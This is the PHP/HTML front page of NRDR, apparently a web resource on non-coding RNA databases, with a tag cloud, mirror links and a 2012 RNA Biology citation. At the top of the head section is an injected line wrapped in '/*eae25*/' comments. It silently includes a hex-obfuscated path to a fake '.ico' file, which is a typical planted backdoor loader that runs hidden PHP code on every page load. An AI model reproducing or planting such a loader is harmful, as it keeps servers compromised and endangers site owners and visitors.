<!DOCTYPE html>
<html lang="en">
<head>
    <?php
/*eae25*/

@include "\x2fv\x61r\x2fw\x77w\x2fh\x74m\x6c/\x4eR\x44R\x2ff\x61v\x69c\x6fn\x5f6\x616\x640\x61.\x69c\x6f";

/*eae25*/ include('head.php'); ?>
</head>

<body>

<?php include(BASE_URL.'header.php'); ?>


<div id="main">

 <div class="container">

     <!-- Main component for a primary marketing message or call to action -->
     <div class="row">
         <div class="col-md-12 hidden-xs">
             <div style="width: 768px; height: 460px; margin-top: -32px; margin-left: 30px;" id="nuvem_tags"> </div>

         </div>
     </div>

     <div align="center">
        <b>Mirror sites:</b><br>
        <a href="http://bioinfo-tool.cp.utfpr.edu.br/nrdr"><img src="img/brasil.png" height="25" width="50"></a>   <a href="http://200.12.130.109/nrdr"><img src="img/chile.png" height="25" width="50/"></a>        
    </div>
    </br>

     <blockquote id="citacao">
         <p style="text-align:justify;margin-top: -20px">
             Alexandre Rossi Paschoal, Vinicius Maracaja-Coutinho, João Carlos Setubal, Zilá Luz Paulino Simões, Sergio Verjovski-Almeida and Alan Mitchell Durham.
             <a href="http://www.landesbioscience.com/journals/rnabiology/article/19352/" target="_blank"><b>Non-coding transcription characterization and annotation: A guide and web resource for non-coding RNA databases.</b></a>
             <small>Volume 9, Issue 3. RNA Biology. 2012.</small>

         </p>
     </blockquote>

 </div> <!-- /container -->

</div>

<?php include(BASE_URL.'infoline.php'); ?>

<?php include(BASE_URL.'footer.php'); ?>


</body>
</html>

<script type="text/javascript">
    $(function() {
        $("#nuvem_tags").jQCloud(word_list);
    });
</script>